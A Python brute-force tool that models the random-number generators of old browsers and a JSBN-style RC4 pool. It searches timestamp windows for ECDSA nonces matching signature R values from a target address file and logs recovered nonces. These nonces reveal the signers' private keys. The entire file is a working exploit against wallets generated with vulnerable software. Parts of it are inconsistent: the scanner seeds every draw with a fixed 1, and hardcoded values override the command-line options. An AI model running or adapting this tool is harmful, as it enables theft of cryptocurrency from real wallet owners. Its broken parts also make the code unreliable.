import sys
import time
import json
import math
import argparse
import subprocess
from multiprocessing import Pool, cpu_count

import coincurve
from Crypto.Cipher import ARC4


# ---------- secp256k1 ----------
P = 0xfffffffffffffffffffffffffffffffffffffffffffffffffffffffefffffc2f
N = 0xfffffffffffffffffffffffffffffffebaaedce6af48a03bbfd25e8cd0364141
Gx = 0x79be667ef9dcbbac55a06295ce870b07029bfcdb2dce28d959f2815b16f81798
Gy = 0x483ada7726a3c4655da4fbfc0e1108a8fd17b448a68554199c47d08ffb10d4b8

M32 = 0xffffffff
M48 = (1 << 48) - 1
MULT = 0x5DEECE66D
ADD = 0xB


# ---------- (kept for reference; unused by the fast path) ----------
def j_double(Pt):
    X, Y, Z = Pt
    if Y == 0:
        return (0, 0, 0)
    A = (X * X) % P
    B = (Y * Y) % P
    C = (B * B) % P
    D = (2 * (((X + B) * (X + B)) % P - A - C)) % P
    E = (3 * A) % P
    F = (E * E) % P
    X3 = (F - 2 * D) % P
    Y3 = (E * (D - X3) - 8 * C) % P
    Z3 = (2 * Y * Z) % P
    return (X3, Y3, Z3)


def j_add(Pt, Qt):
    if Pt[2] == 0:
        return Qt
    if Qt[2] == 0:
        return Pt
    Z1 = (Pt[2] * Pt[2]) % P
    Z2 = (Qt[2] * Qt[2]) % P
    U1 = (Pt[0] * Z2) % P
    U2 = (Qt[0] * Z1) % P
    S1 = (Pt[1] * Qt[2] * Z2) % P
    S2 = (Qt[1] * Pt[2] * Z1) % P
    if U1 == U2:
        if S1 != S2:
            return (0, 0, 0)
        return j_double(Pt)
    H = (U2 - U1) % P
    I = (4 * H * H) % P
    J = (H * I) % P
    rr = (2 * (S2 - S1)) % P
    V = (U1 * I) % P
    X3 = (rr * rr - J - 2 * V) % P
    Y3 = (rr * (V - X3) - 2 * S1 * J) % P
    Z3 = (((Pt[2] + Qt[2]) * (Pt[2] + Qt[2]) - Z1 - Z2) * H) % P
    return (X3, Y3, Z3)


def mul_x(k, Px, Py):
    R = (0, 0, 0)
    Q = (Px, Py, 1)
    while k > 0:
        if k & 1:
            R = j_add(R, Q)
        Q = j_double(Q)
        k >>= 1
    if R[2] == 0:
        return None
    zi = pow(R[2], -1, P)
    return (R[0] * (zi * zi % P)) % P


# ---------- PRNGs ----------
def srand_from_millis(time_ms):
    return int(time_ms) & M32


def msvc_rand(hold):
    hold = (hold * 214013 + 2531011) & M32
    return hold, (hold >> 16) & 0x7FFF


def mwc_step(s0, s1):
    s0 = (18273 * (s0 & 0xFFFF) + (s0 >> 16)) & M32
    s1 = (36969 * (s1 & 0xFFFF) + (s1 >> 16)) & M32
    bits = ((s0 << 14) + (s1 & 0x3FFFF)) & M32
    return s0, s1, bits


def chrome17_renderer(time_ms):
    hold = srand_from_millis(time_ms)
    s0 = 0
    s1 = 0

    def math_random():
        nonlocal hold, s0, s1
        if s0 == 0:
            hold, s0 = msvc_rand(hold)
            hold, s1 = msvc_rand(hold)
        s0, s1, bits = mwc_step(s0, s1)
        return bits

    def navigate():
        nonlocal s0, s1
        s0 = 0
        s1 = 0

    return math_random, navigate


def chrome18_renderer(time_ms):
    hold = srand_from_millis(time_ms)
    hold, priv0 = msvc_rand(hold)
    hold, priv1 = msvc_rand(hold)
    _, _, bits = mwc_step(priv0, priv1)
    hash_seed = bits & 0x3FFFFFFF  # noqa: F841 (matches reference; unused)
    s0 = 0
    s1 = 0

    def math_random():
        nonlocal hold, s0, s1
        if s0 == 0:
            hold, s0 = msvc_rand(hold)
            hold, s1 = msvc_rand(hold)
        s0, s1, bits = mwc_step(s0, s1)
        return bits
        # return bits / pow(2, 32)

    def navigate():
        nonlocal s0, s1
        s0 = 0
        s1 = 0

    return math_random, navigate


def _v8_v17_random16(seed, pending, n):
    math_random, _navigate = chrome17_renderer(seed)
    out = []
    for idx in range(n + pending):
        numerator = math_random()
        if idx >= pending:
            out.append(numerator >> 16)
    return out


def _v8_v18_random16(seed, pending, n):
    math_random, _navigate = chrome18_renderer(seed)
    out = []
    for idx in range(n):
        numerator = math_random()
        out.append(numerator >> 16)
        # out.append(math.floor(numerator * 65536))
        # if idx >= pending:
        #     out.append(numerator >> 16)
    return out


def _firefox_random16(seed, pending, n):
    state = (seed ^ 0x5DEECE66D) & M48

    def nxt(bits):
        nonlocal state
        state = (state * 0x5DEECE66D + 0xB) & M48
        return state >> (48 - bits)

    out = []
    for idx in range(n + pending):
        numerator = (nxt(26) << 27) + nxt(27)
        if idx >= pending:
            out.append((numerator * 65536) >> 53)
    return out


def _safari_random16(seed, pending, n):
    m_low = (seed ^ 0x49616E42) & M32
    m_high = seed & M32
    out = []
    for idx in range(n + pending):
        m_high = ((m_high << 16) + (m_high >> 16)) & M32
        m_high = (m_high + m_low) & M32
        m_low = (m_low + m_high) & M32
        if idx >= pending:
            out.append(m_high >> 16)
    return out


def mix32(temp):
    temp &= M32
    temp = (((temp & 0xFF000000) >> 24) | ((temp & 0x000000FF) << 24) | (temp & 0x00FFFF00)) & M32
    temp = (((temp & 0x0F000F00) >> 4) | ((temp & 0x00F000F0) << 4) | (temp & 0xF00FF00F)) & M32
    temp = (((temp & 0x30303030) >> 2) | ((temp & 0x0C0C0C0C) << 2) | (temp & 0xC3C3C3C3)) & M32
    temp = (((temp & 0x44444444) >> 1) | ((temp & 0x22222222) << 1) | (temp & 0x99999999)) & M32
    return temp


def next_double(state):
    state[0] = (state[0] * MULT + ADD) & M48
    hi = state[0] >> 21
    state[0] = (state[0] * MULT + ADD) & M48
    lo = state[0] >> 21
    value = (hi << 27) + lo
    return (value * 65536) >> 54


def _ie8_random16(time_ms, pending, n):
    t = int(time_ms)
    tL = t & M32
    tH = (t >> 32) & 0xFFFF
    mixed = mix32(tL ^ 0xDEECE66D)
    state = [((mixed << 16) | (tH ^ (tL & 0xFFFF))) & M48]
    out = []
    for idx in range(n + pending):
        numerator = next_double(state)
        if idx >= pending:
            out.append(numerator)
    return out


ENGINES = {
    "v8_17": _v8_v17_random16,
    "v8_18": _v8_v18_random16,
    "firefox": _firefox_random16,
    "safari": _safari_random16,
    "ie8": _ie8_random16,
}


# ---------- pool helpers ----------
def xor32(pool, x, at):
    """XOR the low 4 little-endian bytes of x into pool[at:at+4].

    Equivalent to JS `rng_seed_int` and to the original Python `seed_int`.
    The JS `x & 0xffffffff` truncation is implicit here because each byte
    applies `& 255` after shifting.
    """
    pool[at]     ^= x         & 255
    pool[at + 1] ^= (x >> 8)  & 255
    pool[at + 2] ^= (x >> 16) & 255
    pool[at + 3] ^= (x >> 24) & 255


def build_pool(t1_draws, t1):
    """Build the 256-byte pool from 128 draws, then XOR t1 into bytes 0..3."""
    pool = bytearray(256)
    for i, t in enumerate(t1_draws):
        pool[2 * i]     = (t >> 8) & 255
        pool[2 * i + 1] = t & 255
    xor32(pool, t1, 0)
    return pool


def k_from_pool(pool_base, t2):
    """Given a pool with t1 already XORed in, XOR t2 into bytes 4..7 and derive k."""
    pool = bytearray(pool_base)  # 256-byte copy (cheap)
    xor32(pool, t2, 4)

    cipher = ARC4.new(bytes(pool))
    keystream = cipher.encrypt(bytes(33))
    keystream = b"\x00" + keystream[1:]     # zero first byte (matches reference)
    v = int.from_bytes(keystream, "big")
    return v % (N - 1) + 1


# ---------- original single-shot k_from (kept for reference / selftest) ----------
def k_from(seed, t1, t2, pending, engine="v8_18"):
    draws = ENGINES[engine](seed, pending, 128)
    pool = bytearray(256)
    for i, t in enumerate(draws):
        pool[2 * i]     = (t >> 8) & 255
        pool[2 * i + 1] = t & 255
    xor32(pool, t1, 0)
    xor32(pool, t2, 4)

    cipher = ARC4.new(bytes(pool))
    keystream = cipher.encrypt(bytes(33))
    keystream = b"\x00" + keystream[1:]
    v = int.from_bytes(keystream, "big")
    return v % (N - 1) + 1


# ---------- R extraction ----------
def get_Rx(k):
    """x-coordinate of k*G, with `% N` applied (matches the original get_R)."""
    if k <= 0 or k >= N:
        return None
    try:
        pub = coincurve.PublicKey.from_valid_secret(k.to_bytes(32, "big"))
    except ValueError:
        return None
    return int.from_bytes(pub.format(compressed=True)[1:33], "big") % N


def get_R(k):
    """Original name — thin wrapper."""
    return get_Rx(k)


# ---------- worker ----------
def scan_chunk(args):
    """Scan t1 in [t1_lo, t1_hi) and t2 in [t1, t1+t2_span).

    Returns (t1, off, k, Rx) on hit, else None.
    """
    t1_lo, t1_hi, t2_span, target_R, engine = args
    gen = ENGINES[engine]

    for t1 in range(t1_lo, t1_hi):
        # 128 draws depend ONLY on t1 -> compute once, reuse for all t2.
        # t1_draws = gen(t1, 0, 128)
        t1_draws = gen(1, 0, 128)
        pool_base = build_pool(t1_draws, t1)

        for off in range(t2_span):
            t2 = t1 + off
            k = k_from_pool(pool_base, t2)
            Rx = get_Rx(k)
            if Rx in target_R:
                return (t1, off, k, Rx)
    return None


# ---------- core detection (macOS / Apple Silicon aware) ----------
def get_performance_cores():
    """On Apple Silicon, return only the performance-core count.

    Falls back to cpu_count() on Intel Macs / non-macOS / failure.
    """
    if sys.platform != "darwin":
        return cpu_count()
    try:
        # perflevel0 = highest-performance tier on M-series
        out = subprocess.check_output(
            ["sysctl", "-n", "hw.perflevel0.physicalcpu"],
            stderr=subprocess.DEVNULL,
        ).strip()
        n = int(out)
        if n > 0:
            return n
    except Exception:
        pass
    try:
        out = subprocess.check_output(
            ["sysctl", "-n", "hw.physicalcpu"],
            stderr=subprocess.DEVNULL,
        ).strip()
        n = int(out)
        if n > 0:
            return n
    except Exception:
        pass
    return cpu_count()


# ---------- driver ----------
def main_with_pool(pool, label, end_t1, target, engine="v8_18",
                   window=900_000, t2_span=30):
    """Scan one label using an existing Pool (reused across labels on macOS)."""
    target_R = set(target)
    lo = end_t1 - window
    total = end_t1 - lo
    if total <= 0:
        return (label, 0)

    nproc = pool._processes  # noqa: SLF001 (standard way to read pool size)
    n_tasks = max(nproc * 4, 1)
    chunk = max(1, math.ceil(total / n_tasks))
    tasks = []
    t = lo
    while t < end_t1:
        hi = min(t + chunk, end_t1)
        tasks.append((t, hi, t2_span, target_R, engine))
        t = hi

    found = None
    # `imap_unordered` yields as soon as any worker hits. We break out of the
    # iterator on a hit and DO NOT call pool.terminate() — the pool is reused
    # for the next label, and remaining in-flight tasks simply complete.
    for res in pool.imap_unordered(scan_chunk, tasks, chunksize=1):
        if res is not None:
            found = res
            break

    if found is None:
        return (label, 0)

    t1, off, k, Rx = found
    print(f"[{label}] Success: k={k}  (t1={t1}, t2_off={off}, Rx={Rx})",
          flush=True)
    return (label, k)


# ---------- data ----------
def load_json_data(path="tar_addresses.json"):
    with open(path, "r", encoding="utf-8") as f:
        return json.load(f)


# ---------- selftest ----------
def run_selftest():
    """Verify k_from_pool == original k_from for a range of inputs."""
    engines = ["v8_17", "v8_18", "firefox", "safari", "ie8"]
    cases = [
        (1330107858000, 0),
        (1330107858000, 5),
        (1330107858000, 29),
        (1700000000000, 0),
        (1700000000000, 13),
        (0, 0),
        (1, 0),
    ]
    for engine in engines:
        for t1, off in cases:
            t2 = t1 + off
            k_old = k_from(t1, t1, t2, 0, engine)
            draws = ENGINES[engine](t1, 0, 128)
            pool_base = build_pool(draws, t1)
            k_new = k_from_pool(pool_base, t2)
            assert k_old == k_new, (
                f"[{engine}] t1={t1} off={off}: {k_old} != {k_new}"
            )
    print("selftest OK — k_from_pool matches k_from on all engines")
    # Also verify get_Rx applies % N (nothing to compare against here, but
    # exercise the path).
    k = k_from(123, 1330107858000, 1330107858000, 0, "v8_18")
    Rx = get_Rx(k)
    assert isinstance(Rx, int) and 0 <= Rx < N
    print(f"get_Rx OK (k={k}, Rx={Rx})")


# ---------- entry point ----------
if __name__ == "__main__":
    ap = argparse.ArgumentParser()
    ap.add_argument("--engine", default="v8_18", choices=list(ENGINES.keys()))
    ap.add_argument("--window", type=int, default=900_000,
                    help="t1 window size in ms")
    ap.add_argument("--t2-span", type=int, default=30,
                    help="number of t2 offsets tried per t1")
    ap.add_argument("--nproc", type=int, default=None,
                    help="worker processes (default: perf cores on Apple Silicon)")
    ap.add_argument("--data", default="tar_addresses.json")
    ap.add_argument("--selftest", action="store_true",
                    help="verify k_from_pool == k_from, then exit")
    args = ap.parse_args()

    engine = "v8_17"
    window = 1800000
    t2_span = 40
    file_route = "tar_addresses.json"

    # if True:
    #     run_selftest()
    #     sys.exit(0)

    # nproc = args.nproc or get_performance_cores()
    nproc = 10
    data = load_json_data(file_route)
    print(
        f"loaded {len(data)} labels; engine={engine} "
        f"window={window} t2_span={t2_span} nproc={nproc}",
        flush=True,
    )

    # ---- create ONE Pool, reuse it for every label ----
    with Pool(nproc) as pool:
        for cmp_data in data:
            print(f"Label-> {cmp_data["label"]}")
            label, k_result = main_with_pool(
                pool,
                cmp_data["label"], cmp_data["time"], cmp_data["target"],
                engine=engine,
                window=window,
                t2_span=t2_span,
            )
            if k_result and k_result > 0:
                with open("results.txt", "a", encoding="utf-8") as f:
                    f.write(f"{label} \t{k_result}\n")
                f.flush()